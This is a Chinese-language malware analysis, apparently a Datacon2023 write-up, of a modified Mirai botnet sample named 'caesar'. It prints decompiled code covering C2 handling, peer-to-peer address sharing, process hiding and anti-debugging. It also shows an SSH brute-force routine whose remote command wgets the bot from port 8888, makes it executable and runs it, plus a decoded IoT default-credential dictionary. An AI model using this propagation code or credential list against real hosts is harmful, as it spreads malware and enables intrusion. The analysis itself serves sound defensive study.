## Datacon2023-Caesar

> 针对作者魔改Marai和Marai提高隐蔽性的部分进行分析

main

```c
__int64 __fastcall main(int a1, char **args, char **a3)
{
  unsigned int v4; // eax
  int pings; // edx
  unsigned int v6; // eax
  unsigned int v7; // eax
  unsigned __int8 id_len; // [rsp+1Fh] [rbp-6E1h] BYREF
  int v9; // [rsp+20h] [rbp-6E0h] BYREF
  int err; // [rsp+24h] [rbp-6DCh] BYREF
  socklen_t len; // [rsp+28h] [rbp-6D8h] BYREF
  int pings_1; // [rsp+2Ch] [rbp-6D4h]
  int fd; // [rsp+30h] [rbp-6D0h]
  int mfd; // [rsp+34h] [rbp-6CCh]
  int n; // [rsp+38h] [rbp-6C8h]
  int name_buf_len; // [rsp+3Ch] [rbp-6C4h]
  int v17; // [rsp+40h] [rbp-6C0h]
  unsigned int p_writefds; // [rsp+44h] [rbp-6BCh]
  int v19; // [rsp+48h] [rbp-6B8h]
  unsigned int v20; // [rsp+4Ch] [rbp-6B4h]
  int nfds; // [rsp+50h] [rbp-6B0h]
  int v22; // [rsp+54h] [rbp-6ACh]
  int v23; // [rsp+58h] [rbp-6A8h]
  int pgid; // [rsp+5Ch] [rbp-6A4h]
  char *s1; // [rsp+60h] [rbp-6A0h]
  void *buf; // [rsp+68h] [rbp-698h]
  struct timeval timeout; // [rsp+70h] [rbp-690h] BYREF
  struct sockaddr addr; // [rsp+80h] [rbp-680h] BYREF
  sigset_t set; // [rsp+90h] [rbp-670h] BYREF
  fd_set readfds; // [rsp+110h] [rbp-5F0h] BYREF
  fd_set writefds; // [rsp+190h] [rbp-570h] BYREF
  struct sigaction v32; // [rsp+210h] [rbp-4F0h] BYREF
  char name_buf[32]; // [rsp+2B0h] [rbp-450h] BYREF
  char id_buf[32]; // [rsp+2D0h] [rbp-430h] BYREF
  char rdbuf[1032]; // [rsp+2F0h] [rbp-410h] BYREF
  unsigned __int64 v36; // [rsp+6F8h] [rbp-8h]

  v36 = __readfsqword(0x28u);


  // Delete self
  pings_1 = 0;
  unlink(*args);

  // Signal based control flow
  sigemptyset(&set);
  sigaddset(&set, 2);
  sigprocmask(0, &set, 0LL);
  signal(17, (__sighandler_t)1);
  signal(5, anti_gdb_entry);
  fd = open("/dev/watchdog", 2);

  // Prevent watchdog from 
  // rebooting device
  if ( fd != -1 || (fd = open("/dev/misc/watchdog", 2), fd != -1) )
  {
    LODWORD(timeout.tv_sec) = 1;
    ioctl(fd, 0x80045704uLL, &timeout);
    close(fd);
    fd = 0;
  }
  chdir("/");
  s1 = getenv("DOCKER_IN_CONTAINER");
  if ( !s1 || strcmp(s1, "1") )
  {
    sleep(1u);
    v32.sa_flags = 4;
    sigemptyset(&v32.sa_mask);
    v32.sa_handler = (__sighandler_t)segv_handler;
    if ( sigaction(11, &v32, 0LL) == -1 )
      perror("sigaction");
    v32.sa_flags = 4;
    sigemptyset(&v32.sa_mask);
    v32.sa_handler = (__sighandler_t)segv_handler;
    if ( sigaction(7, &v32, 0LL) == -1 )
      perror("sigaction");

    LOCAL_ADDR = util_local_addr();
    ::addr.sa_family = 2;
    *(_DWORD *)&::addr.sin_port[2] = htonl(0x41DECA35u);// FAKE_CNC_ADDR
    *(_WORD *)::addr.sin_port = htons(0x50u);   // 
                                                // 
                                                // 
    inter();                                    // 自己写的


    // #ifdef DEBUG
    unlock_tbl_if_nodebug(*args);               // 不太喵，table和源程序是一样的
    anti_gdb_entry(0);
    // #endif

    ensure_single_instance();


    rand_init();
    util_zero(id_buf, 0x20u);

    if ( a1 == 2 && (int)util_strlen(args[1]) <= 31 )
    {
      util_strcpy(id_buf, args[1]);
      v4 = util_strlen(args[1]);
      util_zero(args[1], v4);
    }

    // Hide argv0
    name_buf_len = 4 * ((rand_next() & 3) + 3);
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    util_strcpy(*args, name_buf);


    // Hide process name
    name_buf_len = 4 * ((unsigned int)rand_next() % 6 + 3);
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(15, name_buf);

    // Print out system exec
    table_unlock_val(2u);
    buf = (void *)table_retrieve_val(2, &v9);
    write(1, buf, v9);
    write(1, "\n", 1uLL);
    table_lock_val(2u);                         // table_lock_val(TABLE_EXEC_SUCCESS);
                                                // 



    attack_init();
    killer_init();
    while ( 1 )
    {
      do
      {
        while ( 1 )
        {
          do
          {
            memset(&readfds, 0, sizeof(readfds));
            v17 = 0;
            p_writefds = (unsigned int)&writefds;
            memset(&writefds, 0, sizeof(writefds));
            v19 = 0;
            v20 = (unsigned int)&v32;
            if ( fd_ctrl != -1 )
              readfds.fds_bits[fd_ctrl / 64] |= 1LL << (fd_ctrl % 64);
            if ( fd_serv == -1 )
              establish_connection();
            if ( pending_connection )
              writefds.fds_bits[fd_serv / '@'] |= 1LL << (fd_serv % 64);
            else
              readfds.fds_bits[fd_serv / 64] |= 1LL << (fd_serv % 64);

            // Get maximum FD for select
            if ( fd_ctrl <= fd_serv )
              mfd = fd_serv;
            else
              mfd = fd_ctrl;

            // Wait 10s in call to select()
            timeout.tv_usec = 0LL;
            timeout.tv_sec = 10LL;
            nfds = select(mfd + 1, &readfds, &writefds, 0LL, &timeout);
          }
          while ( nfds == -1 );

          // else if (nfds == 0)
          if ( !nfds )
          {
            LOWORD(len) = 0;
            pings = pings_1++;
            if ( !(pings % 6) )
              send(fd_serv, &len, 2uLL, 0x4000);
          }
          if ( fd_ctrl != -1 && (readfds.fds_bits[fd_ctrl / 64] & (1LL << (fd_ctrl % 64))) != 0 )
          {
            len = 16;
            accept(fd_ctrl, &addr, &len);


            // 和源代码不一样的地方========================================
            v6 = time(0LL);
            srand(v6);
            v22 = rand();
            v23 = v22 % 2;
            if ( !(v22 % 2) )
              ssh_Br();


            // ============
            scanner_init();                     // //首先生成随机ip，而后随机选择字典中的用户名密码组合进行telnet登录测试
            killer_kill();
            attack_kill_all();
            kill(-pgid, 9);
            exit(0);
          }


          // Check if CNC connection was established or timed out or errored
          if ( !pending_connection )
            break;
          pending_connection = 0;
          if ( (writefds.fds_bits[fd_serv / 64] & (1LL << (fd_serv % 64))) == 0 )
            goto LABEL_59;
          err = 0;
          len = 4;
          getsockopt(fd_serv, 1, 4, &err, &len);
          if ( err )
          {
            close(fd_serv);
            fd_serv = -1;
            v7 = rand_next();
            sleep(v7 % 10 + 1);                 // sleep((rand_next() % 10) + 1);
          }
          else
          {
            id_len = util_strlen(id_buf);
            LOCAL_ADDR = util_local_addr();
            send(fd_serv, "UD3\"", 4uLL, 0x4000);
            send(fd_serv, &id_len, 1uLL, 0x4000);
            if ( id_len )
              send(fd_serv, id_buf, id_len, 0x4000);
          }
        }
      }
      while ( fd_serv == -1 || (readfds.fds_bits[fd_serv / 64] & (1LL << (fd_serv % 64))) == 0 );
      *__errno_location() = 0;
      n = recv(fd_serv, &len, 2uLL, 16386);
      if ( n != -1 )
        goto LABEL_48;
      if ( *__errno_location() != 11 && *__errno_location() != 11 && *__errno_location() != 4 )
      {
        n = 0;
LABEL_48:
        if ( n )
        {
          if ( (_WORD)len )
          {
            LOWORD(len) = ntohs(len);
            if ( (unsigned __int16)len > 0x400u )
            {
              close(fd_serv);
              fd_serv = -1;
            }
            *__errno_location() = 0;
            n = recv(fd_serv, rdbuf, (unsigned __int16)len, 0x4002);
            if ( n == -1 )
            {
              if ( *__errno_location() != 11 && *__errno_location() != 11 && *__errno_location() != 4 )
              {
                n = 0;
                goto LABEL_58;
              }
            }
            else
            {
              // If n == 0 then we close the connection!
LABEL_58:
              if ( !n )
                goto LABEL_59;

              // Actually read buffer length and buffer data
              recv(fd_serv, &len, 2uLL, 0x4000);
              LOWORD(len) = ntohs(len);
              recv(fd_serv, rdbuf, (unsigned __int16)len, 0x4000);
              if ( (_WORD)len )
                attack_parse((__int64)rdbuf, (unsigned __int16)len);
            }
          }
          else
          {
            recv(fd_serv, &len, 2uLL, 0x4000);
          }
        }
        else
        {
LABEL_59:
          teardown_connection();
        }
      }
    }
  }
  return 0LL;
}
```



### bot间通信



00055FA8BD488A9处在两个子线程内阻塞

```c
unsigned __int64 sub_55FA8BD488A9()
{
  pthread_t newthread; // [rsp+8h] [rbp-18h] BYREF
  pthread_t th; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( !pthread_create(&newthread, 0LL, (void *(*)(void *))start_routine, 0LL)
    && !pthread_create(&th, 0LL, send_info_to_brother, 0LL) )
  {
    pthread_join(newthread, 0LL);
    pthread_join(th, 0LL);
  }
  return __readfsqword(0x28u) ^ v3;
}
```

000055FA8BD4856E send_info_to_brother监听随机端口接收udp报文，如果报文中有`JXNT-PING`字样，返回C2 ip ，nodeip，newtime

```c
void *__fastcall send_info_to_brother(void *a1)
{
  unsigned int v2; // eax
  socklen_t v3; // ebx
  size_t v4; // rax
  socklen_t addr_len; // [rsp+Ch] [rbp-484h] BYREF
  int fd; // [rsp+10h] [rbp-480h]
  int v7; // [rsp+14h] [rbp-47Ch]
  ssize_t v8; // [rsp+18h] [rbp-478h]
  char *inited; // [rsp+20h] [rbp-470h]
  char *v10; // [rsp+28h] [rbp-468h]
  size_t n; // [rsp+30h] [rbp-460h]
  size_t size; // [rsp+38h] [rbp-458h]
  char *v13; // [rsp+40h] [rbp-450h]
  ssize_t v14; // [rsp+48h] [rbp-448h]
  struct sockaddr s; // [rsp+50h] [rbp-440h] BYREF
  struct sockaddr addr; // [rsp+60h] [rbp-430h] BYREF
  char buf[1032]; // [rsp+70h] [rbp-420h] BYREF
  unsigned __int64 v18; // [rsp+478h] [rbp-18h]

  v18 = __readfsqword(0x28u);
  addr_len = 16;
  fd = socket(2, 2, 0);
  if ( fd >= 0 )
  {
    v2 = time(0LL);
    srand(v2);
    v7 = rand() % 40001 + 10000;
    memset(&s, 0, sizeof(s));
    s.sa_family = 2;
    *(_DWORD *)&s.sin_port[2] = inet_addr("0.0.0.0");
    *(_WORD *)s.sin_port = htons(v7);
    if ( bind(fd, &s, 0x10u) >= 0 )
    {
      while ( 1 )
      {
        do
          v8 = recvfrom(fd, buf, 0x400uLL, 0, &addr, &addr_len);
        while ( v8 < 0 );
        if ( v8 > 8 && !strncmp(buf, "JXNT-PING", 9uLL) )
        {
          buf[v8] = 0;
          fflush(stdout);
          inited = init_sharing_info();
	
          v10 = (char *)encode_sharing_info(inited);
          n = strlen(v10);
          size = n + 2;
          v13 = (char *)malloc(n + 2);
          if ( v13 )
          {
            *v13 = n;
            memcpy(v13 + 1, v10, n);
            v13[size - 1] = 0;
            fflush(stdout);
            v3 = addr_len;
            v4 = strlen(v13);
            v14 = sendto(fd, v13, v4, 0, &addr, v3);
          }
        }
        else
        {
          fflush(stdout);
        }
      }
    }
    perror("bind");
    close(fd);
    return 0LL;
  }
  else
  {
    perror("socket");
    return 0LL;
  }
}
```



```
JXNT-C2:%sNODE_IP:%sNODE_PORT:%dNEW_TIME:%s
```



start_routine在table中没有ip被记录的情况下不断监听169.196.166.199 16996

从这里监听到的第一个c2地址（cncIpA）和NodeIpA地址将会被记录作为第二次的监听端口



第二次通过监听botIpA来获取botA记录的c2地址和Nodeip并不管成功更新ip都将记录的Nodeip清空

保证只记录一个最新的Nodeip和c2ip并在Node失去响应后清空ip只留下一个内置的假ip



```c
void __fastcall __noreturn start_routine(void *a1)
{
  int i; // [rsp+0h] [rbp-20h]
  int j; // [rsp+4h] [rbp-1Ch]
  char v3[10]; // [rsp+Eh] [rbp-12h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  for ( i = 0; (unsigned __int64)i <= 8; ++i )
    v3[i] = (aJxntPing[i] ^ 0x66) + 1;
  sub_55FA8BD47974(v3);
  while ( 1 )
  {
    if ( src[0] )
    {
      for ( j = 0; j < dword_55FA8BD53174; ++j )
      {
        src[0] = 0;
        s1 = 0;
        fflush(stdout);
        parse_IP_and_recv_cnc_info(v3, src, port_0);
        sub_55FA8BD48064();
      }
    }
    else
    {
      parse_IP_and_recv_cnc_info(v3, a169196166199, port);
      sub_55FA8BD48064();
      sleep(1u);
    }
  }
}
```



### ssh爆破，产生随机ip扫描设备

```c
void __noreturn sub_55FA8BD4CE60()
{
  int i; // [rsp+Ch] [rbp-14h]
  char *randIp; // [rsp+18h] [rbp-8h]

  malloc(8uLL);
  rand_init();
  decode_warp((__int64)"PMMV", (__int64)"PMMV", 10);
  decode_warp((__int64)"FGDCWNV", (__int64)&unk_55FA8BD4FAED, 9);
  decode_warp((__int64)"cFOKL", (__int64)"CFOKL", 8);
  decode_warp((__int64)"pMMV", (__int64)"TKXZT", 7);
  decode_warp((__int64)"pMMV", (__int64)"FGDCWNV", 6);
  decode_warp((__int64)&unk_55FA8BD4FBD5, (__int64)&unk_55FA8BD4FBD5, 5);
  decode_warp((__int64)&unk_55FA8BD4FBDD, (__int64)&unk_55FA8BD4FBDD, 5);
  decode_warp((__int64)"pMMV", (__int64)"VVLGV", 5);
  decode_warp((__int64)"VGNGAMOCFOKL", (__int64)"VGNGAMOCFOKL", 5);
  decode_warp((__int64)"VGNLGV", (__int64)"VGNLGV", 5);
  decode_warp((__int64)"VGNGAMOCFOKL", (__int64)"CFOKLVGNGAMO", 5);
  decode_warp((__int64)"QWRRMPV", (__int64)"QWRRMPV", 4);
  decode_warp((__int64)"CFOKL", (__int64)&unk_55FA8BD4FC15, 4);
  decode_warp((__int64)"PMMV", (__int64)"CSWCPKM", 3);
  decode_warp((__int64)"FGDCWNV", (__int64)"FGDCWNV", 3);
  decode_warp((__int64)"CFO", (__int64)&unk_55FA8BD4FAED, 3);
  decode_warp((__int64)"PMMV", (__int64)&unk_55FA8BD4FC2A, 2);
  decode_warp((__int64)"PMMV", (__int64)"VQEMKLEML", 2);
  decode_warp((__int64)"CFOKL", (__int64)&unk_55FA8BD4FC42, 1);
  decode_warp((__int64)"PMMV", (__int64)&unk_55FA8BD4FC4B, 1);
  decode_warp((__int64)"cFOKL", (__int64)"ERML", 1);
  decode_warp((__int64)"PMMV", (__int64)"XVG", 1);
  while ( 1 )
  {
    for ( i = 0; i < dword_55FA8BD5322C; ++i )
    {
      randIp = getRandomIp();
      sshBr(*((const char **)qword_55FA8BD53220 + 3 * i), *((const char **)qword_55FA8BD53220 + 3 * i + 1), randIp);
      free(randIp);
    }
  }
}
```

解密用户名-密码字典，对随机ip的ssh服务进行爆破

```c
unsigned __int64 __fastcall sub_55FA8BD4C910(const char *a1, const char *a2, const char *a3)
{
  const char *error; // rax
  int v6; // [rsp+30h] [rbp-490h]
  int v7; // [rsp+34h] [rbp-48Ch]
  __int64 v8; // [rsp+38h] [rbp-488h]
  __int64 v9; // [rsp+40h] [rbp-480h]
  __int64 started; // [rsp+48h] [rbp-478h]
  const char *v11; // [rsp+50h] [rbp-470h]
  char *v12; // [rsp+68h] [rbp-458h]
  char dest[64]; // [rsp+70h] [rbp-450h] BYREF
  char nptr[1032]; // [rsp+B0h] [rbp-410h] BYREF
  unsigned __int64 v15; // [rsp+4B8h] [rbp-8h]

  v15 = __readfsqword(0x28u);
  v8 = ssh_new();
  ssh_options_set(v8, 0LL, a3);
  ssh_options_set(v8, 2LL, &a22);
  if ( (unsigned int)ssh_connect(v8) || (unsigned int)ssh_userauth_password(v8, a1, a2) )
  {
    error = (const char *)ssh_get_error(v8);
    fprintf(stderr, "Error: %s\n", error);
  }
  else
  {
    v9 = ssh_channel_new(v8);
    ssh_channel_open_session(v9);
    ssh_channel_request_exec(v9, "nproc");
    ssh_channel_read(v9, nptr, 1024LL, 0LL);
    v6 = atoi(nptr);
    memset(nptr, 0, 0x400uLL);
    ssh_channel_send_eof(v9);
    ssh_channel_request_exec(v9, "free -m | awk '/^Mem/ {print $2}'");
    ssh_channel_read(v9, nptr, 1024LL, 0LL);
    v7 = atoi(nptr);
    strcat(dest, a1);
    strcat(dest, a2);
    strcat(dest, a3);
    if ( v6 > 2 && v7 > 500 )
    {
      sub_55FA8BD4C329(dest);
LABEL_10:
      ssh_channel_close(v9);
      ssh_disconnect(v8);
      ssh_free(v8);
      return __readfsqword(0x28u) ^ v15;
    }
    started = MHD_start_daemon(8LL, 8888LL, 0LL, 0LL, sub_55FA8BD4C16E, 0LL, 0LL);
    if ( started )
    {
      v11 = (const char *)sub_55FA8BD4C7BE();
      v12 = sub_55FA8BD4C713(
              " wget -t -1 http://",
              v11,
              ":8888/caesar -O /tmp/caesar && cd /tmp && chmod +x caesar&& ./caesar");
      ssh_channel_request_exec(v9, v12);
      sleep(0x64u);
      MHD_stop_daemon(started);
      goto LABEL_10;
    }
    fwrite("Failed to start the server.\n", 1uLL, 0x1CuLL, stderr);
  }
  return __readfsqword(0x28u) ^ v15;
}
```

如果成功，就复制自己到目标机器

### 隐藏信息手段

命令行参数隐藏

```c
    // Hide argv0
    name_buf_len = 4 * ((rand_next() & 3) + 3);
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    util_strcpy(*args, name_buf);
```

进程名隐藏、系统调用测试	

```c
// Hide process name
name_buf_len = 4 * ((unsigned int)rand_next() % 6 + 3);
rand_alphastr(name_buf, name_buf_len);
name_buf[name_buf_len] = 0;
prctl(15, name_buf);

// Print out system exec
table_unlock_val(2u);
buf = (void *)table_retrieve_val(2, &v9);
write(1, buf, v9);
write(1, "\n", 1uLL);
table_lock_val(2u);                         // table_lock_val(TABLE_EXEC_SUCCESS);
                                            // 
```

加载函数地址

```  c
  v9[1] = (__int64)table_unlock_val;
  v9[2] = (__int64)table_retrieve_val;
  v9[3] = (__int64)table_init;
  v9[4] = (__int64)table_lock_val;
  v9[5] = (__int64)util_memcpy;
  v9[6] = (__int64)sub_55FA8BD4E597;
  v9[7] = (__int64)killer_init;
  v9[8] = (__int64)anti_gdb_entry;
  v9[0] = (__int64)ensure_single_instance;
```

隐藏cnc地址解析

```c
//静态分析时 cnc 的定义
.data:000055FA8BD53038 ; __int64 (*resolve_func)(void)
.data:000055FA8BD53038 resolve_func    dq offset util_local_addr
.data:000055FA8BD53038                                         ; DATA XREF: anti_gdb_entry+12↑w
.data:000055FA8BD53038                                         ; establish_connection+65↑r ...
```

运行时加载实际cnc解析

```c
void anti_gdb_entry()
{
  resolve_func = (__int64 (*)(void))resolve_cnc_addr;
}
```

### 加密信息解码

ssh用户密码信息

```
b'root'
b'default'
b'admin'
b'Admin'
b'vizxv'
b'Root'
b'e8ehome'
b'e8telnet'
b'ttnet'
b'telecomadmin'
b'telnet'
b'admintelecom'
b'support'
b'1001chin'
b'aquario'
b'adm'
b'taZz@23495859'
b'tsgoingon'
b'admin123'
b'GM8182'
b'gpon'
b'zte'
```

Marai加密信息

```
b'cnc.changeme.com\x00'
b'\x00\x17'
b'report.changeme.com\x00'
b'\xbb\xe5'
b'listening tun0\x00'
b'https://youtu.be/dQw4w9WgXcQ\x00'
b'/proc/\x00'
b'/exe\x00'
b' (deleted)\x00'
b'/fd\x00'
b'.anime\x00'
b'/status\x00'
b'REPORT %s:%s\x00'
b'HTTPFLOOD\x00'
b'LOLNOGTFO\x00'
b''
b''
b''
b''
b''
b'\\x58\\x4D\\x4E\\x4E\\x43\\x50\\x46\\x22\x00'
b'zollard\x00'
b'GETLOCALIP\x00'
b'shell\x00'
b'enable\x00'
b'system\x00'
b'sh\x00'
b'/bin/busybox MIRAI\x00'
b'MIRAI: applet not found\x00'
b'ncorrect\x00'
b'/bin/busybox ps\x00'
b'/bin/busybox kill -9 \x00'
b'TSource Engine Query\x00'
b'/etc/resolv.conf\x00'
b'nameserver \x00'
b'Connection: keep-alive\x00'
b''
b''
b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\x00'
b''
b''
b''
b''
b'Accept-Language: en-US,en;q=0.8\x00'
b''
b''
b''
b''
b''
b''
b''
b'Content-Type: application/x-www-form-urlencoded\x00'
b"setCookie('\x00"
b'refresh:\x00'
b'location:\x00'
b'set-cookie:\x00'
b'content-length:\x00'
b'transfer-encoding:\x00'
b'chunked\x00'
b'keep-alive\x00'
b'connection:\x00'
b'server: dosarrest\x00'
b'server: cloudflare-nginx\x00'
b''
b''
b''
b''
b'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\x00'
b'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\x00'
b'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\x00'
b''
b'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\x00'
b''
b'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\x00'
b''
b''
```

